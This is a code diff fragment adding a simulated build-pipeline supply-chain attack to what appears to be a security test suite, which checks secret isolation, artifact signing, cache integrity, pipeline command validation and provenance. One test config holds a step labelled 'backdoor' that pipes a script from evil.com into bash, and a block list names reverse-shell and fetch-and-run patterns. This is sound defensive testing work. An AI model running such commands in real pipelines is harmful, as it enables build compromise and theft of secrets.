+        def __init__(self):
+            self.secrets = {
+                "API_KEY": "secret_api_key_123",
+                "DEPLOY_TOKEN": "secret_deploy_token",
+            }
+            self.masked_env = {}
+
+        def prepare_build_env(
+            self, allowed_secrets: set
+        ) -> dict:
+            """Prepare build environment with only allowed secrets."""
+            env = {}
+            for key, value in self.secrets.items():
+                if key in allowed_secrets:
+                    env[key] = value
+                else:
+                    # Mask unauthorized secrets
+                    env[key] = "***MASKED***"
+            self.masked_env = env
+            return env
+
+        def check_secret_leakage(
+            self, output: str
+        ) -> Tuple[bool, str]:
+            """Check if build output contains secrets."""
+            for key, value in self.secrets.items():
+                if value in output and value != "***MASKED***":
+                    return True, f"Secret leaked in output: {key}"
+
+            return False, "No secret leakage detected"
+
+    isolator = SecretIsolator()
+    env = isolator.prepare_build_env({"API_KEY"})  # Only API_KEY allowed
+
+    # Simulate build output containing secret
+    malicious_output = f"Debug: DEPLOY_TOKEN={isolator.secrets['DEPLOY_TOKEN']}"
+    leaked, msg = isolator.check_secret_leakage(malicious_output)
+
+    if leaked:
+        defenses["secret_isolation"] = True
+        secret_note = f"Secret isolation detected leak: {msg}"
+    else:
+        secret_note = "Secret isolation: no leak detection"
+
+    # ========================================================================
+    # Defense 2: Artifact Signing
+    # ========================================================================
+
+    class ArtifactSigner:
+        """Sign and verify build artifacts."""
+
+        def __init__(self, signing_key: str):
+            self.signing_key = signing_key
+
+        def sign_artifact(self, artifact_hash: str) -> str:
+            """Sign an artifact hash."""
+            signature_input = f"{self.signing_key}:{artifact_hash}"
+            return hashlib.sha256(signature_input.encode()).hexdigest()
+
+        def verify_signature(
+            self, artifact_hash: str, signature: str
+        ) -> Tuple[bool, str]:
+            """Verify artifact signature."""
+            expected = self.sign_artifact(artifact_hash)
+            if signature != expected:
+                return False, f"Invalid signature: expected {expected[:16]}..."
+
+            return True, "Signature verified"
+
+    signer = ArtifactSigner("secret_signing_key")
+    artifact_hash = hashlib.sha256(b"legitimate_artifact").hexdigest()
+    valid_sig = signer.sign_artifact(artifact_hash)
+
+    # Attacker tries to tamper and forge signature
+    tampered_hash = hashlib.sha256(b"tampered_artifact").hexdigest()
+    valid, msg = signer.verify_signature(tampered_hash, valid_sig)
+
+    if not valid:
+        defenses["artifact_signing"] = True
+        sign_note = f"Artifact signing blocked: {msg}"
+    else:
+        sign_note = "Artifact signing: tampering not detected"
+
+    # ========================================================================
+    # Defense 3: Cache Validation
+    # ========================================================================
+
+    class CacheValidator:
+        """Validate build cache integrity."""
+
+        def __init__(self):
+            self.cache_entries: Dict[str, dict] = {}
+
+        def store_cache(
+            self, key: str, content: bytes, metadata: dict
+        ):
+            """Store cache entry with integrity hash."""
+            content_hash = hashlib.sha256(content).hexdigest()
+            self.cache_entries[key] = {
+                "content": content,
+                "hash": content_hash,
+                "metadata": metadata,
+                "stored_at": datetime.now(timezone.utc),
+            }
+
+        def retrieve_cache(
+            self, key: str
+        ) -> Tuple[Optional[bytes], str]:
+            """Retrieve and validate cache entry."""
+            entry = self.cache_entries.get(key)
+            if not entry:
+                return None, "Cache miss"
+
+            # Validate integrity
+            current_hash = hashlib.sha256(entry["content"]).hexdigest()
+            if current_hash != entry["hash"]:
+                return None, (
+                    f"Cache corruption: expected {entry['hash'][:16]}..., "
+                    f"got {current_hash[:16]}..."
+                )
+
+            return entry["content"], "Cache hit (verified)"
+
+    cache = CacheValidator()
+    cache.store_cache("build_cache", b"legitimate_content", {"version": "1.0"})
+
+    # Attacker tampers with cache
+    cache.cache_entries["build_cache"]["content"] = b"malicious_content"
+
+    content, msg = cache.retrieve_cache("build_cache")
+
+    if content is None and "corruption" in msg:
+        defenses["cache_validation"] = True
+        cache_note = f"Cache validation detected: {msg}"
+    else:
+        cache_note = f"Cache validation: {msg}"
+
+    # ========================================================================
+    # Defense 4: Pipeline Configuration Validation
+    # ========================================================================
+
+    class PipelineConfigValidator:
+        """Validate CI/CD pipeline configuration."""
+
+        def __init__(self):
+            self.allowed_commands = {
+                "npm install", "npm test", "npm build",
+                "pip install", "pytest",
+                "docker build", "docker push",
+            }
+            self.blocked_patterns = [
+                "curl | bash",
+                "wget | sh",
+                "eval",
+                "nc -e",
+                "bash -i",
+            ]
+
+        def validate_step(
+            self, step: dict
+        ) -> Tuple[bool, str]:
+            """Validate a pipeline step."""
+            command = step.get("run", "")
+
+            # Check for blocked patterns
+            for pattern in self.blocked_patterns:
+                if pattern in command:
+                    return False, f"Blocked pattern in command: {pattern}"
+
+            # Optionally check against allowlist
+            # (may be too restrictive for some use cases)
+
+            return True, "Step validated"
+
+        def validate_pipeline(
+            self, config: dict
+        ) -> Tuple[bool, str, List[str]]:
+            """Validate entire pipeline configuration."""
+            issues = []
+
+            for i, step in enumerate(config.get("steps", [])):
+                valid, msg = self.validate_step(step)
+                if not valid:
+                    issues.append(f"Step {i}: {msg}")
+
+            if issues:
+                return False, "Pipeline validation failed", issues
+
+            return True, "Pipeline validated", []
+
+    pipeline_validator = PipelineConfigValidator()
+
+    malicious_config = {
+        "steps": [
+            {"name": "build", "run": "npm build"},
+            {"name": "backdoor", "run": "curl http://evil.com/shell.sh | bash"},
+        ]
+    }
+
+    valid, msg, issues = pipeline_validator.validate_pipeline(malicious_config)
+
+    if not valid:
+        defenses["config_validation"] = True
+        config_note = f"Config validation blocked: {issues[0][:50]}..."
+    else:
+        config_note = "Config validation: passed"
+
+    # ========================================================================
+    # Defense 5: Provenance Verification
+    # ========================================================================
+
+    class ProvenanceVerifier:
+        """Verify build provenance attestations."""
+
+        def __init__(self, trusted_builders: set):
+            self.trusted_builders = trusted_builders
+
+        def verify_provenance(
+            self, provenance: dict
+        ) -> Tuple[bool, str]:
+            """Verify provenance attestation."""
+            # Check builder identity
+            builder = provenance.get("builder", {}).get("id")
+            if builder not in self.trusted_builders:
+                return False, f"Untrusted builder: {builder}"
+
+            # Check for required fields
+            required_fields = ["buildType", "invocation", "materials"]
+            missing = [f for f in required_fields if f not in provenance]
+            if missing:
+                return False, f"Missing provenance fields: {missing}"
+
+            # Verify signature (simplified)
+            signature = provenance.get("signature")
+            if not signature or len(signature) < 64:
+                return False, "Invalid or missing provenance signature"
+
+            return True, f"Provenance verified: builder={builder}"
+
+    prov_verifier = ProvenanceVerifier({
+        "github-actions",
+        "gitlab-ci",
+        "jenkins-trusted",
+    })
+
+    forged_provenance = {
+        "builder": {"id": "attacker-ci"},
+        "buildType": "generic",
+        "invocation": {},
+        "materials": [],
+        "signature": "forged",
+    }
+
+    valid, msg = prov_verifier.verify_provenance(forged_provenance)
+
+    if not valid:
+        defenses["provenance_verification"] = True
+        prov_note = f"Provenance verification blocked: {msg}"
+    else:
+        prov_note = f"Provenance verification: {msg}"
+
+    # ========================================================================
+    # Calculate Results
+    # ========================================================================
+
+    defenses_held = sum(defenses.values())
+    total_defenses = len(defenses)
+    attack_success = defenses_held < total_defenses - 2
+
+    return AttackResult(
+        attack_name="Build Pipeline Compromise (DP)",
+        success=attack_success,
+        setup_cost_atp=500.0,
+        gain_atp=10000.0 if attack_success else -500.0,
+        roi=20.0 if attack_success else -1.0,
+        detection_probability=0.45,
+        time_to_detection_hours=1440,  # Can persist for months
+        blocks_until_detected=5000,
+        trust_damage=1.00,
+        description=f"""
+BUILD PIPELINE COMPROMISE (Track DP):
+- Secret isolation: {"DEFENDED" if defenses["secret_isolation"] else "VULNERABLE"}
+  {secret_note}
+- Artifact signing: {"DEFENDED" if defenses["artifact_signing"] else "VULNERABLE"}
+  {sign_note}
+- Cache validation: {"DEFENDED" if defenses["cache_validation"] else "VULNERABLE"}
+  {cache_note}
+- Config validation: {"DEFENDED" if defenses["config_validation"] else "VULNERABLE"}
+  {config_note}
+- Provenance verification: {"DEFENDED" if defenses["provenance_verification"] else "VULNERABLE"}
+  {prov_note}
+
+{defenses_held}/{total_defenses} defenses held.
+
+Build pipeline compromise can inject malicious code into all
+artifacts produced by the compromised pipeline.
+""".strip(),
+        mitigation=f"""
+Track DP: Build Pipeline Compromise Mitigation:
+1. Isolate secrets and detect leakage in build output
+2. Sign all artifacts with verified signing keys
+3. Validate cache integrity before use
+4. Block suspicious commands in pipeline configuration
+5. Verify provenance attestations from trusted builders
+
+Current defenses: {defenses_held}/{total_defenses}
+""".strip(),
+        raw_data={
+            "defenses": defenses,
+            "defenses_held": defenses_held,
+            "total_defenses": total_defenses,
+        }
+    )
+
+
+# ---------------------------------------------------------------------------
 # Run All Attacks
 # ---------------------------------------------------------------------------
 
@@ -18904,6 +21293,16 @@ def run_all_attacks() -> List[AttackResult]:
         ("T3 Dimension Isolation Bypass (DM)", attack_t3_dimension_isolation_bypass),
         ("V3 Veracity Witness Collusion (DM)", attack_v3_veracity_witness_collusion),
         ("Role-Task Mismatch Exploitation (DM)", attack_role_task_mismatch),
+        # Track DN: Temporal Consensus Attacks
+        ("Clock Skew Exploitation (DN)", attack_clock_skew_exploitation),
+        ("Temporal Ordering Manipulation (DN)", attack_temporal_ordering_manipulation),
+        ("Consensus Split-Brain (DN)", attack_consensus_split_brain),
+        # Track DO: Side-Channel Attacks
+        ("Timing Side-Channel (DO)", attack_timing_side_channel),
+        ("Error Side-Channel (DO)", attack_error_side_channel),
+        # Track DP: Supply Chain Attacks
+        ("Dependency Confusion (DP)", attack_dependency_confusion),
+        ("Build Pipeline Compromise (DP)", attack_build_pipeline_compromise),
     ]
 
     results = []
